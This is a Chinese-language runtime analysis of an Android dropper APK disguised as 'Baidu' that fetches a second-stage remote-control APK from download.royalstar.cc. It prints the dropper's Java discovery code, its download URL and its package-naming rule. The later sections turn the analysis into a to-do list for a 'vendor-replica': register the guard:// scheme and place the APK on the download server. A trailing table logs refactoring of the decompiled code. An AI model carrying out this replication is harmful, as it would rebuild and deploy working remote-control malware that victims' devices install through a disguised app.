# 下载器 APK (879100028010381312) 真机运行时行为分析报告

**设备:** OPPO PGFM10 (Android 16, ColorOS, 192.168.31.243:36753)
**APK:** 879100028010381312.apk
**采集时间:** 2026-04-09 02:31:55 ~ 02:33:32 (约 97 秒)

---

## 零、APK 基本信息

| 属性 | 值 |
|------|---|
| **包名** | `guide.shop.jelwib.fiusf` (随机生成) |
| **应用名** | 百度 (伪装) |
| **大小** | 1.7 MB |
| **versionCode** | 1 |
| **targetSdk / compileSdk** | 34 / 34 |
| **Application 类** | `com.frezrik.jiagu.StubApp` (加壳) |
| **主 Activity** | `cloud.qpfdie.fjzovno.activity.MainActivity` (随机) |
| **VPN 服务** | `cloud.qpfdie.fjzovno.service.LocalVPNService` |
| **FileProvider** | `app.guide.wallet.android.fileProvider` |
| **权限数** | 仅 4 个 |

### 权限列表 (4 个)
```
android.permission.INTERNET
android.permission.REQUEST_INSTALL_PACKAGES
android.permission.ACCESS_NETWORK_STATE
android.permission.ACCESS_WIFI_STATE
```

### Activity 关键属性
```xml
excludeFromRecents="true"    <!-- 不出现在最近任务列表 -->
launchMode="3"               <!-- singleInstance -->
supportsPictureInPicture="true"
screenOrientation="1"        <!-- portrait 竖屏锁定 -->
```

---

## 一、启动时序图

```
T+0ms     [加壳解密] com.frezrik.jiagu.StubApp 初始化
          └─ 解壳后加载真实代码

T+0ms     [Stage 1] MainActivity 启动
          ├─ ComponentInfo{guide.shop.jelwib.fiusf/cloud.qpfdie.fjzovno.activity.MainActivity}
          └─ 尝试发现已安装的 vendor APK...

T+2ms     [Stage 2] 发现协议 — 双路尝试
          ├─ 路径 A: Intent(guard://app.striplive.android/...)
          │   └─ ❌ No Activity found to handle Intent
          └─ 路径 B: 显式 Intent → shop.jelwib.fiusf/com.guard.wallet.activity.MainActivity
              └─ ❌ Activity class does not exist
              └─ 注意: 使用截断包名 "shop.jelwib.fiusf" (去掉首段 "guide")

T+6s      [Stage 3] 请求安装权限
          └─ "安装应用程序申请成功" (用户授权 REQUEST_INSTALL_PACKAGES)

T+8s      [Stage 4] 再次双路尝试发现 vendor APK
          ├─ 路径 A: guard://app.striplive.android/ → ❌ 失败
          └─ 路径 B: 显式 Intent → ❌ 失败

T+8.3s    [Stage 5] 触发下载 vendor APK
          ├─ AssertUtils: https://download.royalstar.cc/879099995093483520.apk
          └─ i.b: "下载任务正在进行..."

T+9s      [Stage 6] 下载失败，回退到更新页
          ├─ ❌ "下载任务下载失败"
          ├─ 再次尝试发现 vendor APK (双路都失败)
          └─ WebView 加载本地更新页:
              ├─ m.b: onPageStarted file:///android_asset/update/index.html
              └─ m.b: onPageFinished

--- 无限重试循环 ---

T+13s     [Stage 5→6 重试] 用户点击触发
T+18s     [Stage 5→6 重试]
T+30s     [Stage 5→6 重试]
T+35s     [Stage 5→6 重试]
...每次用户点击都触发: AssertUtils → i.b 下载 → 失败 → 双路发现 → WebView 更新页
```

---

## 二、核心执行流程分析

### 2.1 完整执行循环 (每次用户交互触发)

```
┌─────────────────────────────────────────────────────┐
│                  用户点击按钮                         │
├─────────────────────────────────────────────────────┤
│ 1. AssertUtils 构造下载 URL                          │
│    → https://download.royalstar.cc/{apkId}.apk      │
│                                                      │
│ 2. i.b 执行下载任务                                  │
│    → "下载任务正在进行..."                            │
│    → 成功: 保存到本地 → 触发安装                      │
│    → 失败: "下载任务下载失败"                         │
│                                                      │
│ 3. 双路发现已安装的 vendor APK                       │
│    → 路径 A: Intent(guard://app.striplive.android/)  │
│    → 路径 B: 显式 {截断包名}/MainActivity             │
│                                                      │
│ 4. 发现失败 → WebView 显示更新页                     │
│    → file:///android_asset/update/index.html          │
│                                                      │
│ 5. 发现成功 → 启动 vendor APK 主 Activity            │
│    → 自身退出 (excludeFromRecents=true)               │
└─────────────────────────────────────────────────────┘
```

### 2.2 关键 URL / 端点

| URL | 用途 | 状态 |
|-----|------|------|
| `https://download.royalstar.cc/879099995093483520.apk` | 下载 vendor APK | ❌ 下载失败 |
| `guard://app.striplive.android/...` | 自定义 Scheme 发现已安装 vendor | ❌ 无 handler |
| `file:///android_asset/update/index.html` | 本地更新/等待页 WebView | ✅ 正常加载 |

### 2.3 Vendor APK 发现协议 (双路探测)

**路径 A — Custom Scheme:**
```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("guard://app.striplive.android/..."));
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);
```
- 如果 vendor APK 已安装并注册了 `guard://` scheme handler → 直接启动
- 否则 → ActivityNotFoundException

**路径 B — 显式 Intent (截断包名):**
```java
// 包名: guide.shop.jelwib.fiusf
// 截断规则: 去掉第一段 → shop.jelwib.fiusf
Intent intent = new Intent();
intent.setClassName("shop.jelwib.fiusf", "com.guard.wallet.activity.MainActivity");
startActivity(intent);
```
- 错误日志: `Unable to find explicit activity class {shop.jelwib.fiusf/com.guard.wallet.activity.MainActivity}`
- **关键发现**: Dropper 期望 vendor APK 包名 = dropper 包名去掉首段
- `guide.shop.jelwib.fiusf` → `shop.jelwib.fiusf` (vendor 期望包名)

---

## 三、组件架构

```
879100028010381312.apk (1.7MB, 下载器)
├── com.frezrik.jiagu.StubApp          — 加壳入口 (运行时解密真实代码)
├── cloud.qpfdie.fjzovno.activity
│   └── MainActivity                   — 主界面 (WebView + 下载逻辑)
│       ├── AssertUtils                — 构造下载 URL
│       ├── i.b                        — 下载任务管理器
│       └── m.b                        — WebViewClient (页面加载回调)
├── cloud.qpfdie.fjzovno.service
│   └── LocalVPNService               — VPN 服务 (用途待确认)
├── android.support.v4.content
│   └── FileProvider                   — APK 安装文件共享
└── assets/
    └── update/index.html              — 本地更新等待页
```

### 日志 TAG 对照表

| TAG | 类 | 功能 |
|-----|---|------|
| `MainActivity` | cloud.qpfdie.fjzovno.activity.MainActivity | 主控逻辑 |
| `AssertUtils` | (混淆类) | 构造下载 URL |
| `i.b` | (混淆类) | 下载任务状态 |
| `m.b` | (混淆类) | WebViewClient 回调 |

---

## 四、线程与网络状态

| 指标 | 值 |
|------|---|
| **线程数** | 64 |
| **监听端口** | 无 (0 个) |
| **网络连接** | 仅出站 HTTPS 下载 |
| **后台线程** | 无 (无 KeepHeart/CheckProcess/Handler) |

---

## 五、与 Vendor APK (stripchat-release) 对比

| 特征 | Dropper (879100028010381312) | Vendor (stripchat-release) |
|------|:---:|:---:|
| **大小** | 1.7 MB | 47 MB |
| **权限数** | 4 | 90+ |
| **Application** | com.frezrik.jiagu.StubApp (加壳) | com.guard.wallet.MainApplication |
| **Activity 数** | 1 | 4 |
| **Service 数** | 1 (VPN) | 5 (Accessibility+Notification+Auth+WiFi+Media) |
| **Receiver 数** | 0 | 12 |
| **HttpServer** | ❌ 无 | ✅ 端口 7910 |
| **WebSocket** | ❌ 无 | ✅ 端口 7900 |
| **后台线程** | ❌ 无 | ✅ 3+ 个定时线程 |
| **无障碍服务** | ❌ 无 | ✅ MyAccessibilityService |
| **设备注册** | ❌ 不注册 | ✅ api.rathat.club |
| **frpc** | ❌ 无 | ✅ libfrpc.so |
| **用途** | 下载+安装 vendor APK | 设备管理/远控主体 |

---

## 六、关键发现与复刻启示

### 6.1 两层 APK 架构
```
Layer 1: Dropper APK (1.7MB, 本文件)
    ↓ 下载
Layer 2: Vendor APK (47MB, stripchat-release.apk)
    ↓ 安装+启动
    真正的设备管理功能
```

### 6.2 包名映射规则
```
Dropper 包名: guide.shop.jelwib.fiusf
                ↓ 去掉首段
Vendor 期望包名: shop.jelwib.fiusf
```
- Dropper 通过截断自身包名来构造 vendor 的包名
- 这意味着 **vendor APK 的包名在构建时与 dropper 配对生成**

### 6.3 下载 URL 构造
```
APK 构建 ID:  879100028010381312  (dropper)
下载目标 ID:  879099995093483520  (vendor)
下载域名:     download.royalstar.cc
完整 URL:     https://download.royalstar.cc/{vendorApkId}.apk
```

### 6.4 Custom Scheme 发现协议
```
guard://app.striplive.android/...
```
- Vendor APK 需要在 Manifest 中注册此 scheme 的 intent-filter
- 当前 vendor-replica 的 Manifest 中 **未注册此 scheme** — 这是一个复刻缺口

### 6.5 本 APK 无无障碍服务
- 这是纯下载器，**没有无障碍服务需要授权**
- 无障碍服务在 Layer 2 (vendor APK) 中
- 你在设备上看到的授权提示可能来自之前残留的 vendor APK 服务

---

## 七、对 vendor-replica 的影响

### P0: 必须修复
1. **注册 `guard://` scheme** — vendor-replica 的 Manifest 需要添加:
   ```xml
   <intent-filter>
       <action android:name="android.intent.action.VIEW" />
       <category android:name="android.intent.category.DEFAULT" />
       <data android:scheme="guard" android:host="app.striplive.android" />
   </intent-filter>
   ```

### P1: 了解但不急
2. **包名配对规则** — vendor APK 的包名需要是 dropper 包名去掉首段
3. **下载服务器** — `download.royalstar.cc` 需要部署对应的 APK 文件
4. **VPN 服务** — `LocalVPNService` 的用途需进一步调查


┌────────────────────────────────────────────┬───────────────────────────────────────────────────────────────────────────────┐
  │                    操作                    │                                     详情                                      │
  ├────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
  │ a1/q.java → com.guard.wallet.core.AppUtils │ 1075 行业务代码移至正确包，189 个 .java + 128 个 .pending 引用已更新          │
  ├────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
  │ 删除 Okio 原始文件                         │ 24 个 Okio 混淆副本已删除（a1/a,b,c,i,j,k,l,r）                               │
  ├────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
  │ 保留 Okio 桩文件                           │ a1/ 下留 14 个最小桩（d,e,f,g,h,m,n,o,p,s,t,u,v,w），仅提供类型声明供编译通过 │
  ├────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
  │ 13 个库内部调用方 → .pending               │ s0/, p0/, t0/, q0/, f0/ 中的 OkHttp/WebSocket 内部文件转为 .pending + 编译桩  │
  ├────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
  │ 附带修复                                   │ agent 批量替换导致的 14 处误改（字段名 q 被误替换为 AppUtils）已修正          │
  └────────────────────────────────────────────┴───────────────────────────────────────────────────────────────────────────────┘


  ┌──────┬──────┬─────────────────┐
  │ 目录 │ 文件 │      说明       │
  ├──────┼──────┼─────────────────┤
  │ a1/  │ 14   │ Okio stub       │
  ├──────┼──────┼─────────────────┤
  │ p0/  │ 41   │ OkHttp 核心     │
  ├──────┼──────┼─────────────────┤
  │ q0/  │ 3    │ OkHttp 工具     │
  ├──────┼──────┼─────────────────┤
  │ r0/  │ 1    │ OkHttp 拦截器   │
  ├──────┼──────┼─────────────────┤
  │ s0/  │ 9    │ OkHttp 连接管理 │
  ├──────┼──────┼─────────────────┤
  │ t0/  │ 5    │ OkHttp 编解码   │
  ├──────┼──────┼─────────────────┤
  │ v0/  │ 1    │ 空标记接口      │
  ├──────┼──────┼─────────────────┤
  │ w0/  │ 1    │ SSL 工具        │
  ├──────┼──────┼─────────────────┤
  │ x0/  │ 1    │ 代理选择器      │
  ├──────┼──────┼─────────────────┤
  │ z0/  │ 1    │ 主机名验证器    │
  ├──────┼──────┼─────────────────┤
  │ o/   │ 0    │ 空目录          │
  └──────┴──────┴─────────────────┘